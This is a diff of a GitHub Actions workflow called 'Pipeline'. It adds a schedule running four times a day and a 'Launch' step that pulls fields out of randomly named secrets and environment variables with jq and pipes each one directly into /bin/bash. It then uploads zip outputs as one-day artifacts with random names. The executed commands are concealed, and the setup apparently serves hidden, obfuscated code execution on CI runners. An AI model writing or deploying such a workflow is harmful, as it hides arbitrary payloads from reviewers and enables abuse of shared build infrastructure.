@@ -2,6 +2,8 @@ name: Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '2 3,9,15,21 * * *'
 env:
   CI: true
 concurrency:
@@ -17,16 +19,19 @@ jobs:
           fetch-depth: 1
       - name: Launch
         env:
-          uxwyg8678: ${{ secrets.uxwyg8678 }}
+          i4771: ${{ secrets.i4771 }}
         run: |
-          printf '%s' "$uxwyg8678" | jq -r .s132 | /bin/bash
-          printf '%s' "$na56" | jq -r .cxxk707 | /bin/bash
-          echo $sp9396 | jq -r .koc8 | /bin/bash
-          echo $d175 | jq -r .je62 | /bin/bash
+          printf '%s' "$i4771" | jq -r .hs955 | /bin/bash
+          echo $vck87591 | jq -r .vfa8 | /bin/bash
+          echo $kdzw1523 | jq -r .h5 | /bin/bash
+          echo $fazvi2351 | jq -r .istaf126 | /bin/bash
+          printf '%s' "$srh94" | jq -r .tbbl161 | /bin/bash
+          printf '%s' "$uvt605" | jq -r .gnel1 | /bin/bash
+          printf '%s' "$awmet6630" | jq -r .xqb020 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
         with:
-          name: z6pFsCdj
+          name: uPM2eFhj
           path: "*.zip"
           retention-days: 1
